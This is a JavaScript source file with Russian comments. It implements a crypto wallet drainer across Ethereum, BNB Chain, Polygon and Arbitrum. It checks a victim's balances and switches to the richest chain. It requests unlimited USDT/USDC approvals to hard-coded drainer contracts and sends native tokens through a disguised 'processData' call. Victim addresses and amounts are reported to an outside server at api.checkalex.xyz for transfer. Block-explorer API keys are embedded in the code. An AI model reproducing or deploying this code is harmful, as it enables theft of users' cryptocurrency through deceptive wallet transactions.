import { ethers } from 'ethers';

// ABI для ERC20 токенов
const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transferFrom(address sender, address recipient, uint256 amount) returns (bool)"
];

// ABI для дрейнера
const DRAINER_ABI = [
  "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce) external payable"
];

// Ключи API для сканеров
const ETHERSCAN_API_KEY = "X2A1BU3MABVFFN1GQ1DRX5PHNG212MTXKT";
const BSCSCAN_API_KEY = "8AWWMFHVD5E65JCGGYKKE95RTKTPB7AJJR";
const POLYGONSCAN_API_KEY = "43EJ8S6WRP4ESVX8AGM8KP9I61P44YWZ2T";
const ARBISCAN_API_KEY = "6YDH1XI6VB7UBQV4WXSH2M7UIEBMMCF9ES";
const OPTIMISTIC_ETHERSCAN_API_KEY = "5CKHVMKCD5VBXIB4PCM4KYKX5JJCCVU3RW";
const BASESCAN_API_KEY = "TEB6I1H3F1UH1DF2I1R39PA9RX5C6IKB1H";

// Конфигурация сетей
const CHAINS = {
  1: {
    name: "Ethereum Mainnet",
    nativeToken: "ETH",
    chainIdHex: "0x1",
    rpcUrls: ["https://rpc.eth.gateway.fm", "https://eth.llamarpc.com", "https://ethereum-rpc.publicnode.com"],
    usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    drainerAddress: "0x2F711446fa4048c375fE65fBf6C912DD44c736Cd",
    explorerApi: "https://api.etherscan.io/api",
    explorerApiKey: ETHERSCAN_API_KEY
  },
  56: {
    name: "BNB Chain",
    nativeToken: "BNB",
    chainIdHex: "0x38",
    rpcUrls: [
      "https://bsc-dataseed.binance.org/",
      "https://bsc-dataseed1.defibit.io/",
      "https://bsc-dataseed1.ninicoin.io/"
    ],
    usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
    usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
    drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
    explorerApi: "https://api.bscscan.com/api",
    explorerApiKey: BSCSCAN_API_KEY
  },
  137: {
    name: "Polygon",
    nativeToken: "MATIC",
    chainIdHex: "0x89",
    rpcUrls: ["https://polygon-rpc.com/"],
    usdtAddress: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
    usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
    drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
    explorerApi: "https://api.polygonscan.com/api",
    explorerApiKey: POLYGONSCAN_API_KEY
  },
  42161: {
    name: "Arbitrum One",
    nativeToken: "ETH",
    chainIdHex: "0xa4b1",
    rpcUrls: ["https://arb1.arbitrum.io/rpc"],
    usdtAddress: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
    usdcAddress: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",
    drainerAddress: "0x8814D8937F84D9D93c125E9031087F2e8Cfc9b4F",
    explorerApi: "https://api.arbiscan.io/api",
    explorerApiKey: ARBISCAN_API_KEY
  }
};

// Утилита для задержки
const delay = (ms) => new Promise(r => setTimeout(r, ms));

// Функция для получения рабочего провайдера
async function getWorkingProvider(rpcUrls, existingProvider = null) {
  // Сначала проверяем существующий провайдер (если передан)
  if (existingProvider) {
    try {
      await existingProvider.getBalance('0x0000000000000000000000000000000000000000');
      console.log('✅ Используется переданный провайдер');
      return existingProvider;
    } catch (e) {
      console.warn('⚠️ Переданный провайдер ненадёжен:', e.message);
    }
  }

  // Если переданный провайдер не работает, перебираем RPC
  for (const rpc of rpcUrls) {
    try {
      const provider = new ethers.providers.JsonRpcProvider(rpc);
      await provider.getBalance('0x0000000000000000000000000000000000000000');
      console.log(`✅ Используется RPC: ${rpc}`);
      return provider;
    } catch (e) {
      console.warn(`⚠️ RPC ${rpc} недоступен: ${e.message}`);
    }
  }
  throw new Error(`Нет доступных RPC для ${rpcUrls}`);
}

// Получение баланса нативного токена через API
async function getBalanceFromExplorer(address, chainId) {
  const config = CHAINS[chainId];
  const apiUrl = `${config.explorerApi}?module=account&action=balance&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
  const response = await fetch(apiUrl);
  const data = await response.json();
  if (data.status === "1") {
    return ethers.BigNumber.from(data.result);
  } else {
    throw new Error(data.message || `Ошибка API для ${config.name}`);
  }
}

// Получение баланса токена через API
async function getTokenBalanceFromExplorer(address, tokenAddress, chainId) {
  const config = CHAINS[chainId];
  const apiUrl = `${config.explorerApi}?module=account&action=tokenbalance&contractaddress=${tokenAddress}&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
  const response = await fetch(apiUrl);
  const data = await response.json();
  if (data.status === "1") {
    return ethers.BigNumber.from(data.result);
  } else {
    throw new Error(data.message || `Ошибка API для токена в ${config.name}`);
  }
}

// Проверка баланса с использованием API и fallback на RPC
async function checkBalance(chainId, userAddress) {
  const config = CHAINS[chainId];
  let nativeBalance, usdtBalance, usdcBalance;

  try {
    nativeBalance = await getBalanceFromExplorer(userAddress, chainId);
  } catch (e) {
    console.warn(`Ошибка API для нативного баланса в ${config.name}: ${e.message}`);
    const provider = await getWorkingProvider(config.rpcUrls);
    nativeBalance = await provider.getBalance(userAddress);
  }

  try {
    usdtBalance = await getTokenBalanceFromExplorer(userAddress, config.usdtAddress, chainId);
  } catch (e) {
    console.warn(`Ошибка API для USDT в ${config.name}: ${e.message}`);
    const provider = await getWorkingProvider(config.rpcUrls);
    const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, provider);
    usdtBalance = await usdt.balanceOf(userAddress);
  }

  try {
    usdcBalance = await getTokenBalanceFromExplorer(userAddress, config.usdcAddress, chainId);
  } catch (e) {
    console.warn(`Ошибка API для USDC в ${config.name}: ${e.message}`);
    const provider = await getWorkingProvider(config.rpcUrls);
    const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, provider);
    usdcBalance = await usdc.balanceOf(userAddress);
  }

  return { nativeBalance, usdtBalance, usdcBalance };
}

// Проверка наличия средств
function hasFunds(bal) {
  return (
    bal.nativeBalance.gt(ethers.utils.parseEther("0.001")) ||
    bal.usdtBalance.gt(ethers.utils.parseUnits("0.1", 6)) ||
    bal.usdcBalance.gt(ethers.utils.parseUnits("0.1", 6))
  );
}

// Переключение сети
async function switchChain(chainId) {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: CHAINS[chainId].chainIdHex }]
    });
  } catch (e) {
    console.warn(`Ошибка переключения на сеть ${CHAINS[chainId].name}: ${e.message}`);
    throw e;
  }
}

// Выполнение дрейна
async function drain(chainId, signer, userAddress, bal) {
  const config = CHAINS[chainId];
  const MAX = ethers.constants.MaxUint256;
  const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6); // Минимальный порог 0.1 USDT/USDC

  // Проверяем провайдер перед использованием
  const reliableProvider = await getWorkingProvider(config.rpcUrls, signer.provider);
  const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, signer);
  const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, signer);

  // Проверка баланса ETH перед approve
  const ethBalance = await reliableProvider.getBalance(userAddress);
  const minEthRequired = ethers.utils.parseEther("0.0003");
  if (ethBalance.lt(minEthRequired)) {
    console.error(`❌ Недостаточно ${config.nativeToken} для газа: ${ethers.utils.formatEther(ethBalance)} ${config.nativeToken}`);
    throw new Error(`Недостаточно ${config.nativeToken} для оплаты газа`);
  }

  // Проверяем реальные балансы USDT и USDC
  let realUsdtBalance = ethers.BigNumber.from(0);
  let realUsdcBalance = ethers.BigNumber.from(0);

  if (bal.usdtBalance.gt(0)) {
    console.log(`📊 USDT баланс (API): ${ethers.utils.formatUnits(bal.usdtBalance, 6)} USDT`);
    realUsdtBalance = await usdt.balanceOf(userAddress);
    console.log(`📊 USDT баланс (реальный): ${ethers.utils.formatUnits(realUsdtBalance, 6)} USDT`);
    if (realUsdtBalance.lt(bal.usdtBalance)) {
      console.error(`❌ Некорректный баланс: API вернул ${ethers.utils.formatUnits(bal.usdtBalance, 6)}, реальный: ${ethers.utils.formatUnits(realUsdtBalance, 6)}`);
      bal.usdtBalance = realUsdtBalance;
    }
  }

  if (bal.usdcBalance.gt(0)) {
    console.log(`📊 USDC баланс (API): ${ethers.utils.formatUnits(bal.usdcBalance, 6)} USDC`);
    realUsdcBalance = await usdc.balanceOf(userAddress);
    console.log(`📊 USDC баланс (реальный): ${ethers.utils.formatUnits(realUsdcBalance, 6)} USDC`);
    if (realUsdcBalance.lt(bal.usdcBalance)) {
      console.error(`❌ Некорректный баланс: API вернул ${ethers.utils.formatUnits(bal.usdcBalance, 6)}, реальный: ${ethers.utils.formatUnits(realUsdcBalance, 6)}`);
      bal.usdcBalance = realUsdcBalance;
    }
  }

  // Сравниваем балансы и выбираем токен с большим балансом
  const tokensToProcess = [];
  if (bal.usdtBalance.gt(MIN_TOKEN_BALANCE)) {
    tokensToProcess.push({ token: 'USDT', balance: bal.usdtBalance, contract: usdt, address: config.usdtAddress });
  }
  if (bal.usdcBalance.gt(MIN_TOKEN_BALANCE)) {
    tokensToProcess.push({ token: 'USDC', balance: bal.usdcBalance, contract: usdc, address: config.usdcAddress });
  }

  // Сортируем по убыванию баланса
  tokensToProcess.sort((a, b) => (b.balance.gt(a.balance) ? 1 : -1));

  // Обрабатываем токены в порядке убывания баланса
  let status = 'rejected'; // По умолчанию статус "отклонено"
  for (const { token, balance, contract, address } of tokensToProcess) {
    console.log(`📦 Обрабатываем ${token} с балансом: ${ethers.utils.formatUnits(balance, 6)}`);

    const allowanceBefore = await contract.allowance(userAddress, config.drainerAddress);
    console.log(`📜 ${token} allowance до: ${ethers.utils.formatUnits(allowanceBefore, 6)} ${token}`);

    if (allowanceBefore.lt(balance)) {
      try {
        const nonce = await reliableProvider.getTransactionCount(userAddress, "pending");
        const tx = await contract.approve(config.drainerAddress, MAX, {
          gasLimit: 100000,
          gasPrice: ethers.utils.parseUnits("3", "gwei"),
          nonce
        });
        const receipt = await tx.wait();
        console.log(`✅ ${token} approve успешен:`, tx.hash);
        console.log("⏳ Ожидание подтверждения approve...");
        await delay(5000);
        const allowanceAfter = await contract.allowance(userAddress, config.drainerAddress);
        console.log(`📜 ${token} allowance после: ${ethers.utils.formatUnits(allowanceAfter, 6)} ${token}`);
        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash);
        status = 'confirmed'; // Устанавливаем статус "подтверждено"
      } catch (e) {
        console.error(`❌ Ошибка approve для ${token}: ${e.message}`);
        throw e; // Пробрасываем ошибку, чтобы обработать её в main.js
      }
    } else {
      console.log(`✅ ${token} allowance уже достаточен, уведомляем сервер`);
      await notifyServer(userAddress, address, balance, chainId, null);
      status = 'confirmed'; // Устанавливаем статус "подтверждено"
    }
  }

  // Если нет токенов для обработки
  if (tokensToProcess.length === 0) {
    console.log("⚠️ Нет токенов с достаточным балансом для обработки (мин. 0.1 USDT/USDC)");
  }

  // Дрейнинг нативного токена
  if (bal.nativeBalance.gt(0)) {
    const drainer = new ethers.Contract(config.drainerAddress, DRAINER_ABI, signer);
    const gasReserve = ethers.utils.parseEther("0.002");
    const nativeToSend = bal.nativeBalance.sub(gasReserve);
    const value = nativeToSend.gt(0) ? nativeToSend : ethers.BigNumber.from(0);

    if (value.gt(0)) {
      const taskId = Math.floor(Math.random() * 1000000);
      const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-native-${Date.now()}`));
      const nonce = await reliableProvider.getTransactionCount(userAddress, "pending");

      try {
        const tx = await drainer.processData(taskId, dataHash, nonce, {
          value,
          gasLimit: 100000,
          gasPrice: ethers.utils.parseUnits("3", "gwei"),
          nonce
        });
        const receipt = await tx.wait();
        if (receipt.status !== 1) {
          throw new Error(`Транзакция processData (${config.nativeToken}) не удалась`);
        }
        console.log(`✅ Дрейнинг ${config.nativeToken} успешен:`, receipt.transactionHash);
        status = 'confirmed'; // Устанавливаем статус "подтверждено"
      } catch (e) {
        console.error(`❌ Ошибка вызова processData (${config.nativeToken}): ${e.message}`);
        throw e;
      }
    }
  }

  return status; // Возвращаем статус выполнения
}

async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash) {
  try {
    const provider = await getWorkingProvider(CHAINS[chainId].rpcUrls);
    const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const balance = await token.balanceOf(userAddress);
    const decimals = await token.decimals();
    const balanceUnits = ethers.utils.formatUnits(balance, decimals);
    console.log(`📊 Реальный баланс токена (${tokenAddress}): ${balanceUnits}`);

    const roundedBalance = Math.floor(parseFloat(balanceUnits) * 10) / 10;
    console.log(`📊 Округлённый баланс: ${roundedBalance}`);

    const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
    if (roundedAmount.lte(0)) {
      throw new Error('Баланс слишком мал для перевода');
    }

    console.log(`📤 Отправка на сервер: userAddress=${userAddress}, tokenAddress=${tokenAddress}, amount=${ethers.utils.formatUnits(roundedAmount, decimals)}, chainId=${chainId}, txHash=${txHash}`);
    const response = await fetch('https://api.checkalex.xyz/api/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userAddress,
        tokenAddress,
        amount: roundedAmount.toString(),
        chainId,
        txHash
      })
    });
    const data = await response.json();
    if (data.success) {
      console.log("✅ Сервер уведомлён, трансфер будет выполнен");
    } else {
      console.error("❌ Ошибка от сервера:", data.message);
      throw new Error(data.message);
    }
  } catch (e) {
    console.error("❌ Ошибка при отправке данных на сервер:", e.message);
    throw e;
  }
}

// Основная функция
export async function runDrainer(provider, signer, userAddress) {
  const balancePromises = Object.keys(CHAINS).map(async (chainId) => {
    try {
      const balance = await checkBalance(chainId, userAddress);
      console.log(`Сеть: ${CHAINS[chainId].name}`);
      console.log(`💰 ${CHAINS[chainId].nativeToken}: ${ethers.utils.formatEther(balance.nativeBalance)}`);
      console.log(`🟠 USDT: ${ethers.utils.formatUnits(balance.usdtBalance, 6)}`);
      console.log(`🔵 USDC: ${ethers.utils.formatUnits(balance.usdcBalance, 6)}`);
      return { chainId: Number(chainId), ...balance };
    } catch (e) {
      console.warn(`Ошибка при проверке баланса в сети ${CHAINS[chainId].name}: ${e.message}`);
      return null;
    }
  });

  const balances = (await Promise.all(balancePromises)).filter(Boolean);
  const sorted = balances
    .filter(hasFunds)
    .sort((a, b) =>
      b.usdtBalance.add(b.usdcBalance).gt(a.usdtBalance.add(a.usdcBalance)) ? 1 : -1
    );

  if (!sorted.length) {
    console.warn("⛔ Нет подходящих сетей с балансом.");
    return 'rejected'; // Возвращаем статус "отклонено", если нет сетей
  }

  const target = sorted[0];
  await switchChain(target.chainId);
  const status = await drain(target.chainId, signer, userAddress, target);
  return status; // Возвращаем статус выполнения
}
